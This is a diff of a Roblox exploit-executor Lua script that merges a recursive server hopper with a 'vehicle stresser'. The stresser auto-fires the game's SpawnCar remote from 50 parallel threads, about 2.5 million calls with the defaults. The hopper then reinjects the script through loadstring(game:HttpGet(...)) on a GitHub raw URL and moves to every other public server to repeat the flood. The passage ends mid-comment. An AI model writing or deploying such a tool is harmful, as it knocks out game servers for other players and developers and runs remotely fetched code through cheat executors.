@@ -1,1006 +1,671 @@
 --[[
-    Recursive Server Hopper
+    ============================================================
+    MERGED SCRIPT
+    Recursive Server Hopper  +  Vehicle Stresser
 
-    CONFIGURATION
+    Flow:
+      1. Validate config / executor capabilities.
+      2. Build vehicle menu UI.
+      3. Auto-run the vehicle stresser (if enabled).
+      4. When spawning finishes, start the recursive server hop.
+      5. Hop reinjects this same script on every teleport.
+    ============================================================
 ]]
 
-local AUTO_REJOIN = true
-local REJOIN_SAME_SERVER = false
-local recursive_execution = true
+--==============================================================
+-- RECURSIVE HOP CONFIGURATION
+--==============================================================
+local AUTO_REJOIN           = true          -- master switch (kept for compatibility)
+local REJOIN_SAME_SERVER    = false         -- hop config: false = always fresh servers
+local recursive_execution   = true
+local SCRIPT_URL            = "https://raw.githubusercontent.com/femce4l20/testies/refs/heads/main/test1.json"
+local MAX_SERVER_PAGES      = 100
+local INITIAL_DELAY         = 1.5
+local TELEPORT_DELAY        = 0.5
+local VISITED_SETTING       = "RecursiveServerHop_Visited_v4"
 
--- Raw URL containing this Lua script.
--- The extension does NOT matter as long as the response body is Lua.
-local SCRIPT_URL =
-    "https://raw.githubusercontent.com/femce4l20/testies/refs/heads/main/test1.json"
-
-local MAX_SERVER_PAGES = 100
-
-local INITIAL_DELAY = 1.5
-local TELEPORT_DELAY = 0.5
-
-local VISITED_SETTING =
-    "RecursiveServerHop_Visited_v4"
-
+--==============================================================
+-- VEHICLE STRESSER CONFIGURATION
+--==============================================================
+local DEFAULT_SPAWN_COUNT        = 500
+local SPAWN_DELAY                = 0
+local STRESS_MULTIPLIER          = 100     -- base * this * PARALLEL_THREADS
+local PARALLEL_THREADS           = 50
+local BUTTON_NAME                = "Steel Coil"
+local AUTO_RUN_VEHICLE_SPAWNER   = true    -- skip waiting for a click
 
 --==============================================================
 -- SERVICES
 --==============================================================
-
-local Players =
-    game:GetService("Players")
-
-local TeleportService =
-    game:GetService("TeleportService")
-
-local HttpService =
-    game:GetService("HttpService")
-
-local LocalPlayer =
-    Players.LocalPlayer
-
+local Players            = game:GetService("Players")
+local TeleportService    = game:GetService("TeleportService")
+local HttpService        = game:GetService("HttpService")
+local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local UserInputService   = game:GetService("UserInputService")
+local LocalPlayer        = Players.LocalPlayer
+local PlayerGui          = LocalPlayer:WaitForChild("PlayerGui")
 
 --==============================================================
 -- EXECUTOR COMPATIBILITY
 --==============================================================
-
 local function getQueueTeleport()
-
-    if type(queue_on_teleport) == "function" then
-        return queue_on_teleport
-    end
-
-    if syn
-        and type(syn.queue_on_teleport) == "function" then
-
-        return syn.queue_on_teleport
-    end
-
-    if fluxus
-        and type(fluxus.queue_on_teleport) == "function" then
-
-        return fluxus.queue_on_teleport
-    end
-
+    if type(queue_on_teleport) == "function" then return queue_on_teleport end
+    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
+    if fluxus and type(fluxus.queue_on_teleport) == "function" then return fluxus.queue_on_teleport end
     return nil
 end
-
-local queueteleport =
-    getQueueTeleport()
-
-
---==============================================================
--- HTTP
---==============================================================
+local queueteleport = getQueueTeleport()
 
 local function getHttp()
-
     if type(game.HttpGet) == "function" then
-
-        return function(url)
-            return game:HttpGet(url)
-        end
-
+        return function(url) return game:HttpGet(url) end
     end
-
-    local requestFunction =
-        request
-        or http_request
-        or (syn and syn.request)
-        or (fluxus and fluxus.request)
-
+    local requestFunction = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
     if type(requestFunction) == "function" then
-
         return function(url)
-
-            local response =
-                requestFunction({
-                    Url = url,
-                    Method = "GET"
-                })
-
-            if response
-                and response.Body then
-
-                return response.Body
-            end
-
-            error(
-                "HTTP request returned no body"
-            )
+            local response = requestFunction({ Url = url, Method = "GET" })
+            if response and response.Body then return response.Body end
+            error("HTTP request returned no body")
         end
     end
-
     return nil
 end
-
-local httpGet =
-    getHttp()
-
+local httpGet = getHttp()
 
 --==============================================================
--- VALIDATION
+-- VALIDATION (gate the whole merged run)
 --==============================================================
-
 if not AUTO_REJOIN then
-
-    warn(
-        "[RecursiveHop] AUTO_REJOIN = false"
-    )
-
+    warn("[Merged] AUTO_REJOIN = false — aborting.")
     return
 end
-
-if not SCRIPT_URL
-    or SCRIPT_URL == ""
-    or SCRIPT_URL:find(
-        "YOUR%-RAW%-SCRIPT%-URL"
-    ) then
-
-    warn(
-        "[RecursiveHop] Invalid SCRIPT_URL."
-    )
-
+if not SCRIPT_URL or SCRIPT_URL == "" or SCRIPT_URL:find("YOUR%-RAW%-SCRIPT%-URL") then
+    warn("[Merged] Invalid SCRIPT_URL — aborting.")
     return
 end
-
-if recursive_execution
-    and not queueteleport then
-
-    warn(
-        "[RecursiveHop] queue_on_teleport unavailable."
-    )
-
+if recursive_execution and not queueteleport then
+    warn("[Merged] queue_on_teleport unavailable — aborting.")
     return
 end
-
 if not httpGet then
-
-    warn(
-        "[RecursiveHop] No HTTP function available."
-    )
-
+    warn("[Merged] No HTTP function available — aborting.")
     return
 end
-
 
 --==============================================================
 -- SERVER VISIT STORAGE
 --==============================================================
-
 local visited = {}
 
-
 local function loadVisited()
-
-    local success, stored =
-        pcall(function()
-
-            return TeleportService:
-                GetTeleportSetting(
-                    VISITED_SETTING
-                )
-
-        end)
-
+    local success, stored = pcall(function()
+        return TeleportService:GetTeleportSetting(VISITED_SETTING)
+    end)
     if not success then
-
-        warn(
-            "[RecursiveHop] Failed to load visited list:",
-            stored
-        )
-
+        warn("[Merged] Failed to load visited list:", stored)
         return
     end
-
     if typeof(stored) == "table" then
-
         for jobId, value in pairs(stored) do
-
-            if value == true then
-                visited[
-                    tostring(jobId)
-                ] = true
-            end
-
+            if value == true then visited[tostring(jobId)] = true end
         end
-
         return
     end
-
-    if typeof(stored) == "string"
-        and stored ~= "" then
-
-        local decodeSuccess, decoded =
-            pcall(function()
-
-                return HttpService:
-                    JSONDecode(stored)
-
-            end)
-
-        if decodeSuccess
-            and typeof(decoded) == "table" then
-
+    if typeof(stored) == "string" and stored ~= "" then
+        local decodeSuccess, decoded = pcall(function()
+            return HttpService:JSONDecode(stored)
+        end)
+        if decodeSuccess and typeof(decoded) == "table" then
             for jobId, value in pairs(decoded) do
-
-                if value == true then
-                    visited[
-                        tostring(jobId)
-                    ] = true
-                end
-
+                if value == true then visited[tostring(jobId)] = true end
             end
         end
     end
 end
-
 
 local function saveVisited()
-
     local copy = {}
-
     for jobId, value in pairs(visited) do
-
-        if value then
-            copy[
-                tostring(jobId)
-            ] = true
-        end
-
+        if value then copy[tostring(jobId)] = true end
     end
-
-    local success, err =
-        pcall(function()
-
-            TeleportService:
-                SetTeleportSetting(
-                    VISITED_SETTING,
-                    copy
-                )
-
-        end)
-
-    if success then
-        return true
-    end
-
-    warn(
-        "[RecursiveHop] Table save failed:",
-        err
-    )
-
-    local encodeSuccess, encoded =
-        pcall(function()
-
-            return HttpService:
-                JSONEncode(copy)
-
-        end)
-
-    if not encodeSuccess then
-        return false
-    end
-
-    local fallbackSuccess, fallbackErr =
-        pcall(function()
-
-            TeleportService:
-                SetTeleportSetting(
-                    VISITED_SETTING,
-                    encoded
-                )
-
-        end)
-
+    local success, err = pcall(function()
+        TeleportService:SetTeleportSetting(VISITED_SETTING, copy)
+    end)
+    if success then return true end
+    warn("[Merged] Table save failed:", err)
+    local encodeSuccess, encoded = pcall(function()
+        return HttpService:JSONEncode(copy)
+    end)
+    if not encodeSuccess then return false end
+    local fallbackSuccess, fallbackErr = pcall(function()
+        TeleportService:SetTeleportSetting(VISITED_SETTING, encoded)
+    end)
     if not fallbackSuccess then
-
-        warn(
-            "[RecursiveHop] JSON save failed:",
-            fallbackErr
-        )
-
+        warn("[Merged] JSON save failed:", fallbackErr)
         return false
     end
-
     return true
 end
-
 
 loadVisited()
 
-
---==============================================================
--- CURRENT SERVER
---==============================================================
-
-local currentJobId =
-    tostring(game.JobId)
-
-print(
-    "[RecursiveHop] Current server:",
-    currentJobId
-)
-
+local currentJobId = tostring(game.JobId)
+print("[Merged] Current server:", currentJobId)
 if currentJobId ~= "" then
-
     visited[currentJobId] = true
-
     saveVisited()
 end
 
-
 --==============================================================
 -- REINJECTION
---
--- IMPORTANT:
--- We register OnTeleport immediately.
---
--- We ALSO have queueForTeleport(), which is called immediately
--- before initiating the teleport.
---
--- This gives executors two opportunities to register the loader.
--- The guard prevents duplicate queueing during one teleport.
 --==============================================================
-
 local teleportQueueRegistered = false
 
-
 local function buildQueuedLoader()
-
-    -- Keep this in the same form as the supplied Infinite Yield
-    -- implementation.
-
-    return "loadstring(game:HttpGet('"
-        .. SCRIPT_URL
-        .. "'))()"
+    return "loadstring(game:HttpGet('" .. SCRIPT_URL .. "'))()"
 end
 
-
 local function queueForTeleport()
-
-    if not recursive_execution then
-        return false
-    end
-
-    if teleportQueueRegistered then
-        return true
-    end
-
+    if not recursive_execution then return false end
+    if teleportQueueRegistered then return true end
     if not queueteleport then
-
-        warn(
-            "[RecursiveHop] queue_on_teleport unavailable."
-        )
-
+        warn("[Merged] queue_on_teleport unavailable.")
         return false
     end
-
-    local code =
-        buildQueuedLoader()
-
-    print(
-        "[RecursiveHop] Registering teleport loader..."
-    )
-
-    local success, err =
-        pcall(function()
-
-            queueteleport(code)
-
-        end)
-
+    local code = buildQueuedLoader()
+    print("[Merged] Registering teleport loader...")
+    local success, err = pcall(function() queueteleport(code) end)
     if not success then
-
-        warn(
-            "[RecursiveHop] queue_on_teleport failed:",
-            err
-        )
-
+        warn("[Merged] queue_on_teleport failed:", err)
         return false
     end
-
     teleportQueueRegistered = true
-
-    print(
-        "[RecursiveHop] Teleport loader registered."
-    )
-
+    print("[Merged] Teleport loader registered.")
     return true
 end
 
-
---==============================================================
--- ON TELEPORT FALLBACK
---==============================================================
-
-Players.LocalPlayer.OnTeleport:Connect(
-    function(state)
-
-        print(
-            "[RecursiveHop] OnTeleport:",
-            tostring(state)
-        )
-
-        if not recursive_execution then
-            return
-        end
-
-        -- If the pre-teleport queue somehow wasn't registered,
-        -- register it from OnTeleport just like Infinite Yield.
-        if not teleportQueueRegistered then
-
-            queueForTeleport()
-
-        end
-    end
-)
-
+Players.LocalPlayer.OnTeleport:Connect(function(state)
+    print("[Merged] OnTeleport:", tostring(state))
+    if not recursive_execution then return end
+    if not teleportQueueRegistered then queueForTeleport() end
+end)
 
 --==============================================================
 -- SERVER API
 --==============================================================
-
 local function fetchServers()
-
     local servers = {}
     local cursor = nil
-
-    for page = 1, MAX_SERVER_PAGES do
-
-        local url =
-            ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100")
-            :format(game.PlaceId)
-
-        if cursor
-            and cursor ~= "" then
-
-            url =
-                url
-                .. "&cursor="
-                .. HttpService:UrlEncode(
-                    cursor
-                )
+    for _ = 1, MAX_SERVER_PAGES do
+        local url = ("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId)
+        if cursor and cursor ~= "" then
+            url = url .. "&cursor=" .. HttpService:UrlEncode(cursor)
         end
-
         local body
-
-        local requestSuccess, requestErr =
-            pcall(function()
-
-                body = httpGet(url)
-
-            end)
-
-        if not requestSuccess then
-
-            warn(
-                "[RecursiveHop] Server API failed:",
-                requestErr
-            )
-
-            break
-        end
-
+        local ok, err = pcall(function() body = httpGet(url) end)
+        if not ok then warn("[Merged] Server API failed:", err); break end
         local data
-
-        local decodeSuccess, decodeErr =
-            pcall(function()
-
-                data =
-                    HttpService:
-                    JSONDecode(body)
-
-            end)
-
-        if not decodeSuccess then
-
-            warn(
-                "[RecursiveHop] Server JSON failed:",
-                decodeErr
-            )
-
-            break
-        end
-
-        if typeof(data) ~= "table" then
-
-            warn(
-                "[RecursiveHop] Invalid server response."
-            )
-
-            break
-        end
-
+        local decodeOk, decodeErr = pcall(function() data = HttpService:JSONDecode(body) end)
+        if not decodeOk then warn("[Merged] Server JSON failed:", decodeErr); break end
+        if typeof(data) ~= "table" then warn("[Merged] Invalid server response."); break end
         if typeof(data.data) == "table" then
-
             for _, server in ipairs(data.data) do
-
-                if server.id then
-
-                    table.insert(
-                        servers,
-                        server
-                    )
-
-                end
-
+                if server.id then table.insert(servers, server) end
             end
         end
-
-        cursor =
-            data.nextPageCursor
-
-        if not cursor
-            or cursor == "" then
-
-            break
-        end
+        cursor = data.nextPageCursor
+        if not cursor or cursor == "" then break end
     end
-
     return servers
 end
 
-
---==============================================================
--- SERVER SELECTION
---==============================================================
-
 local function getCandidates()
-
-    local servers =
-        fetchServers()
-
-    print(
-        "[RecursiveHop] Servers returned:",
-        #servers
-    )
-
-    local preferred = {}
-    local fallback = {}
-
+    local servers = fetchServers()
+    print("[Merged] Servers returned:", #servers)
+    local preferred, fallback = {}, {}
     for _, server in ipairs(servers) do
-
-        local jobId =
-            tostring(server.id)
-
-        local isCurrent =
-            jobId == currentJobId
-
-        local alreadyVisited =
-            visited[jobId] == true
-
-        if not alreadyVisited
-            and (
-                REJOIN_SAME_SERVER
-                or not isCurrent
-            ) then
-
-            table.insert(
-                fallback,
-                server
-            )
-
-            local playing =
-                tonumber(
-                    server.playing
-                ) or 0
-
-            local maxPlayers =
-                tonumber(
-                    server.maxPlayers
-                ) or 0
-
-            if maxPlayers <= 0
-                or playing < maxPlayers then
-
-                table.insert(
-                    preferred,
-                    server
-                )
-
+        local jobId = tostring(server.id)
+        local isCurrent = jobId == currentJobId
+        local alreadyVisited = visited[jobId] == true
+        if not alreadyVisited and (REJOIN_SAME_SERVER or not isCurrent) then
+            table.insert(fallback, server)
+            local playing = tonumber(server.playing) or 0
+            local maxPlayers = tonumber(server.maxPlayers) or 0
+            if maxPlayers <= 0 or playing < maxPlayers then
+                table.insert(preferred, server)
             end
         end
     end
-
-    if #preferred > 0 then
-        return preferred
-    end
-
+    if #preferred > 0 then return preferred end
     return fallback
 end
 
-
 local function chooseServer()
-
-    local candidates =
-        getCandidates()
-
-    if #candidates == 0 then
-        return nil
-    end
-
-    return candidates[
-        math.random(
-            1,
-            #candidates
-        )
-    ]
+    local candidates = getCandidates()
+    if #candidates == 0 then return nil end
+    return candidates[math.random(1, #candidates)]
 end
-
 
 --==============================================================
 -- DONE UI
 --==============================================================
-
 local function showDone()
-
-    local PlayerGui =
-        LocalPlayer:
-        FindFirstChildOfClass(
-            "PlayerGui"
-        )
-
-    if not PlayerGui then
-        return
-    end
-
-    local old =
-        PlayerGui:
-        FindFirstChild(
-            "RecursiveHopDone"
-        )
-
-    if old then
-        old:Destroy()
-    end
-
-    local gui =
-        Instance.new("ScreenGui")
-
-    gui.Name =
-        "RecursiveHopDone"
-
-    gui.ResetOnSpawn =
-        false
-
-    gui.IgnoreGuiInset =
-        true
-
-    gui.DisplayOrder =
-        2147483647
-
-
-    local background =
-        Instance.new("Frame")
-
-    background.Size =
-        UDim2.fromScale(
-            1,
-            1
-        )
-
-    background.BorderSizePixel =
-        0
-
-    background.BackgroundColor3 =
-        Color3.fromRGB(
-            0,
-            0,
-            0
-        )
-
-    background.Parent =
-        gui
-
-
-    local label =
-        Instance.new("TextLabel")
-
-    label.AnchorPoint =
-        Vector2.new(
-            0.5,
-            0.5
-        )
-
-    label.Position =
-        UDim2.fromScale(
-            0.5,
-            0.5
-        )
-
-    label.Size =
-        UDim2.fromScale(
-            0.8,
-            0.2
-        )
-
-    label.BackgroundTransparency =
-        1
-
-    label.Text =
-        "done."
-
-    label.TextColor3 =
-        Color3.fromRGB(
-            255,
-            255,
-            255
-        )
-
-    label.TextScaled =
-        true
-
-    label.Font =
-        Enum.Font.GothamBold
-
-    label.Parent =
-        background
-
-    gui.Parent =
-        PlayerGui
+    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+    if not pg then return end
+    local old = pg:FindFirstChild("RecursiveHopDone")
+    if old then old:Destroy() end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "RecursiveHopDone"
+    gui.ResetOnSpawn = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 2147483647
+    local background = Instance.new("Frame")
+    background.Size = UDim2.fromScale(1, 1)
+    background.BorderSizePixel = 0
+    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    background.Parent = gui
+    local label = Instance.new("TextLabel")
+    label.AnchorPoint = Vector2.new(0.5, 0.5)
+    label.Position = UDim2.fromScale(0.5, 0.5)
+    label.Size = UDim2.fromScale(0.8, 0.2)
+    label.BackgroundTransparency = 1
+    label.Text = "done."
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextScaled = true
+    label.Font = Enum.Font.GothamBold
+    label.Parent = background
+    gui.Parent = pg
 end
-
 
 --==============================================================
 -- DESTROY PARTS
 --==============================================================
-
 local function destroyEveryPart()
-
-    local descendants =
-        game:GetDescendants()
-
-    local destroyed =
-        0
-
-    for _, instance in ipairs(
-        descendants
-    ) do
-
-        if instance:IsA(
-            "BasePart"
-        ) then
-
-            pcall(function()
-
-                instance:Destroy()
-
-                destroyed += 1
-
-            end)
-
+    local destroyed = 0
+    for _, instance in ipairs(game:GetDescendants()) do
+        if instance:IsA("BasePart") then
+            pcall(function() instance:Destroy(); destroyed += 1 end)
         end
     end
-
     pcall(function()
-
-        local terrain =
-            workspace:
-            FindFirstChildOfClass(
-                "Terrain"
-            )
-
-        if terrain then
-            terrain:Clear()
-        end
-
+        local terrain = workspace:FindFirstChildOfClass("Terrain")
+        if terrain then terrain:Clear() end
     end)
-
-    print(
-        "[RecursiveHop] Destroyed parts:",
-        destroyed
-    )
+    print("[Merged] Destroyed parts:", destroyed)
 end
-
 
 --==============================================================
 -- TELEPORT
 --==============================================================
-
 local function teleportToServer(server)
-
-    if not server
-        or not server.id then
-
-        return false
-    end
-
-    local targetJobId =
-        tostring(server.id)
-
-    if targetJobId == "" then
-        return false
-    end
-
-    -- Never target an already visited JobId.
+    if not server or not server.id then return false end
+    local targetJobId = tostring(server.id)
+    if targetJobId == "" then return false end
     if visited[targetJobId] then
-
-        print(
-            "[RecursiveHop] Refusing visited server:",
-            targetJobId
-        )
-
+        print("[Merged] Refusing visited server:", targetJobId)
         return false
     end
-
-    if not REJOIN_SAME_SERVER
-        and targetJobId == currentJobId then
-
-        print(
-            "[RecursiveHop] Refusing current server."
-        )
-
+    if not REJOIN_SAME_SERVER and targetJobId == currentJobId then
+        print("[Merged] Refusing current server.")
         return false
     end
-
-
-    --==========================================================
-    -- MARK TARGET BEFORE TELEPORT
-    --==========================================================
 
     visited[targetJobId] = true
     saveVisited()
-
-
-    --==========================================================
-    -- RESET QUEUE STATE FOR THIS TELEPORT
-    --==========================================================
-
-    teleportQueueRegistered =
-        false
-
-
-    --==========================================================
-    -- QUEUE BEFORE TELEPORT
-    --
-    -- This is the important fix.
-    --
-    -- We don't wait for OnTeleport to queue the script.
-    --==========================================================
+    teleportQueueRegistered = false
 
     if recursive_execution then
-
-        local queued =
-            queueForTeleport()
-
-        if not queued then
-
-            warn(
-                "[RecursiveHop] Could not queue reinjection."
-            )
-
-            -- Undo target reservation because we never
-            -- successfully started the teleport.
-            visited[targetJobId] =
-                nil
-
+        if not queueForTeleport() then
+            warn("[Merged] Could not queue reinjection.")
+            visited[targetJobId] = nil
             saveVisited()
-
             return false
         end
     end
 
+    print("[Merged] Next server:", targetJobId)
+    task.wait(TELEPORT_DELAY)
 
-    print(
-        "[RecursiveHop] Next server:",
-        targetJobId
-    )
-
-    task.wait(
-        TELEPORT_DELAY
-    )
-
-
-    --==========================================================
-    -- TELEPORT
-    --==========================================================
-
-    local success, err =
-        pcall(function()
-
-            TeleportService:
-                TeleportToPlaceInstance(
-                    game.PlaceId,
-                    targetJobId,
-                    LocalPlayer
-                )
-
-        end)
-
+    local success, err = pcall(function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId, LocalPlayer)
+    end)
     if not success then
-
-        warn(
-            "[RecursiveHop] Teleport call failed:",
-            err
-        )
-
-        visited[targetJobId] =
-            nil
-
+        warn("[Merged] Teleport call failed:", err)
+        visited[targetJobId] = nil
         saveVisited()
-
         return false
     end
-
-    print(
-        "[RecursiveHop] Teleport request sent."
-    )
-
+    print("[Merged] Teleport request sent.")
     return true
 end
 
+--==============================================================
+-- RECURSIVE HOP DRIVER
+--==============================================================
+local function startRecursiveHop()
+    print("[Merged] Starting recursive hop...")
+    local attempts = 0
+    while true do
+        attempts += 1
+        if attempts > 50 then
+            warn("[Merged] Too many failed server attempts.")
+            break
+        end
+        local target = chooseServer()
+        if not target then
+            print("[Merged] No unvisited public servers found.")
+            break
+        end
+        if teleportToServer(target) then
+            return  -- teleport started; this copy will leave the server
+        end
+        task.wait(0.5)
+    end
+    task.wait(0.5)
+    destroyEveryPart()
+    showDone()
+    print("[Merged] done.")
+end
+
+--==============================================================
+-- VEHICLE SPAWNER (UI + stress logic)
+--==============================================================
+local SpawnCar  = ReplicatedStorage:WaitForChild("SpawnCar")
+local xeValue   = ReplicatedStorage:WaitForChild("xe")  -- expected BoolValue
+
+-- --- Run token -------------------------------------------------
+local state = PlayerGui:FindFirstChild("VehicleMenuState")
+if not state then
+    state = Instance.new("StringValue")
+    state.Name = "VehicleMenuState"
+    state.Parent = PlayerGui
+end
+local RUN_TOKEN = tostring(os.clock()) .. "_" .. tostring(math.random(1, 1e9))
+state.Value = RUN_TOKEN
+
+local function isCurrentRun()
+    return state.Parent ~= nil and state.Value == RUN_TOKEN
+end
+
+-- --- UI construction ------------------------------------------
+local function clearOwnedChildren(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        if child.Name == "VehicleMenuRoot"
+            or child.Name == "ButtonHolder"
+            or child.Name == "xe"
+            or child.Name == "object"
+            or child.Name == "VIP"
+            or child.Name == BUTTON_NAME then
+            child:Destroy()
+        end
+    end
+end
+
+local host = script.Parent
+if not host or (not host:IsA("GuiObject") and not host:IsA("ScreenGui")) then
+    host = PlayerGui:FindFirstChildWhichIsA("ScreenGui") or Instance.new("ScreenGui")
+    if not host.Parent then
+        host.Name = "VehicleMenuGui"
+        host.ResetOnSpawn = false
+        host.Parent = PlayerGui
+    end
+end
+
+if host:IsA("ScreenGui") then
+    local oldRoot = host:FindFirstChild("VehicleMenuRoot")
+    if oldRoot then oldRoot:Destroy() end
+else
+    clearOwnedChildren(host)
+end
+
+local menuRoot
+if host:IsA("ScreenGui") then
+    menuRoot = Instance.new("Frame")
+    menuRoot.Name = "VehicleMenuRoot"
+    menuRoot.Size = UDim2.fromOffset(360, 190)
+    menuRoot.Position = UDim2.new(0.5, -180, 0.5, -75)
+    menuRoot.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    menuRoot.BorderSizePixel = 0
+    menuRoot.Active = true
+    menuRoot.Parent = host
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = menuRoot
+else
+    menuRoot = host
+    menuRoot.Active = true
+end
+
+-- --- Dragging --------------------------------------------------
+local dragging, dragStart, startPos = false, nil, nil
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    menuRoot.Position = UDim2.new(
+        startPos.X.Scale, startPos.X.Offset + delta.X,
+        startPos.Y.Scale, startPos.Y.Offset + delta.Y
+    )
+end
+
+menuRoot.InputBegan:Connect(function(input)
+    if not isCurrentRun() then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = menuRoot.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+menuRoot.InputChanged:Connect(function(input)
+    if not isCurrentRun() then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+        if dragging then updateDrag(input) end
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if not isCurrentRun() then return end
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
+-- --- Title -----------------------------------------------------
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -20, 0, 30)
+title.Position = UDim2.fromOffset(10, 8)
+title.BackgroundTransparency = 1
+title.Text = "Vehicle Menu"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 22
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = menuRoot
+
+-- --- Placeholder frames (kept for parity with original) --------
+local function ensureFrame(name)
+    local obj = menuRoot:FindFirstChild(name)
+    if obj then obj:Destroy() end
+    obj = Instance.new("Frame")
+    obj.Name = name
+    obj.Size = UDim2.new(1, 0, 1, 0)
+    obj.BackgroundTransparency = 1
+    obj.BorderSizePixel = 0
+    obj.Visible = false
+    obj.Parent = menuRoot
+    return obj
+end
+ensureFrame("xe")
+ensureFrame("object")
+ensureFrame("VIP")
+
+-- --- Button holder --------------------------------------------
+local listHolder = menuRoot:FindFirstChild("ButtonHolder")
+if listHolder then listHolder:Destroy() end
+listHolder = Instance.new("Frame")
+listHolder.Name = "ButtonHolder"
+listHolder.Size = UDim2.new(1, -20, 1, -55)
+listHolder.Position = UDim2.fromOffset(10, 45)
+listHolder.BackgroundTransparency = 1
+listHolder.Parent = menuRoot
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 8)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = listHolder
+
+local function makeLabel(text)
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, 0, 0, 22)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = Color3.fromRGB(220, 220, 220)
+    lbl.Font = Enum.Font.SourceSans
+    lbl.TextSize = 18
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    return lbl
+end
+
+-- --- Spawn count row ------------------------------------------
+local countRow = Instance.new("Frame")
+countRow.Name = "SpawnCountRow"
+countRow.Size = UDim2.new(1, 0, 0, 54)
+countRow.BackgroundTransparency = 1
+countRow.Parent = listHolder
+
+local countLabel = makeLabel("Spawn Count")
+countLabel.Parent = countRow
+
+local countBox = Instance.new("TextBox")
+countBox.Name = "SpawnCountBox"
+countBox.Size = UDim2.new(1, 0, 0, 28)
+countBox.Position = UDim2.fromOffset(0, 24)
+countBox.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
+countBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+countBox.Font = Enum.Font.SourceSansBold
+countBox.TextSize = 18
+countBox.Text = tostring(DEFAULT_SPAWN_COUNT)
+countBox.ClearTextOnFocus = false
+countBox.PlaceholderText = "Enter number of spawns"
+countBox.Parent = countRow
+local countCorner = Instance.new("UICorner")
+countCorner.CornerRadius = UDim.new(0, 8)
+countCorner.Parent = countBox
+
+-- --- Run button -----------------------------------------------
+local runButton = Instance.new("TextButton")
+runButton.Name = "RunButton"
+runButton.Size = UDim2.new(1, 0, 0, 42)
+runButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+runButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+runButton.Font = Enum.Font.SourceSansBold
+runButton.TextSize = 20
+runButton.Text = "Run"
+runButton.AutoButtonColor = false
+runButton.Parent = listHolder
+local runCorner = Instance.new("UICorner")
+runCorner.CornerRadius = UDim.new(0, 8)
+runCorner.Parent = runButton
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "StatusLabel"
+statusLabel.Size = UDim2.new(1, 0, 0, 20)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Ready"
+statusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+statusLabel.Font = Enum.Font.SourceSans
+statusLabel.TextSize = 16
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = listHolder
+
+-- --- State / helpers ------------------------------------------
+local selectedVehicleName = BUTTON_NAME
+local running = false
+
+local function getSpawnCount()
+    local n = tonumber(countBox.Text)
+    if not n then return DEFAULT_SPAWN_COUNT end
+    n = math.floor(n)
+    if n < 1 then n = 1 end
+    return n
+end
+
+local function syncVisibility()
+    if not isCurrentRun() then return end
+    menuRoot.Visible = xeValue.Value
+end
+xeValue.Changed:Connect(syncVisibility)
+syncVisibility()
+
+--==============================================================
+-- RUN SPAWN -> RECURSIVE HOP
+--==============================================================
+local function runSpawn()
+    if running then return end
+    if not isCurrentRun() then return end
+    running = true
+
+    runButton.Text = "Running..."
+    runButton.BackgroundColor3 = Color3.fromRGB(180, 120, 40)
+    statusLabel.Text = "Spawning..."
+
+    local baseCount          = getSpawnCount()
+    local totalPerThread     = baseCount * STRESS_MULTIPLIER
+    local grandTotal         = totalPerThread * PARALLEL_THREADS
+
+    local character = LocalPlayer.Character
+    if character then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid and humanoid.SeatPart and humanoid.SeatPart:IsA("VehicleSeat") then
+            humanoid.Sit = false
+            task.wait(0.1)
+        end
+    end
+
+    local completedThreads = 0
+    for _ = 1, PARALLEL_THREADS do
+        task.spawn(function()
+            for _ = 1, totalPerThread do
+                if not isCurrentRun() then break end
+                SpawnCar:FireServer(selectedVehicleName)
+            end
+            completedThreads = completedThreads + 1
+        end)
+    end
+
+    task.spawn(function()
+        while completedThreads < PARALLEL_THREADS and isCurrentRun() do
+            task.wait(0.1)
+        end
+        if not isCurrentRun() then return end
+
+        statusLabel.Text = "Done (" .. tostring(grandTotal) .. ") — hopping..."
+        runButton.Text = "Hopping..."
+        runButton.BackgroundColor3 = Color3.fromRGB(180, 120, 40)
+        running = false
+
+        -- Hand off to the recursive hopper. If it can't find a target
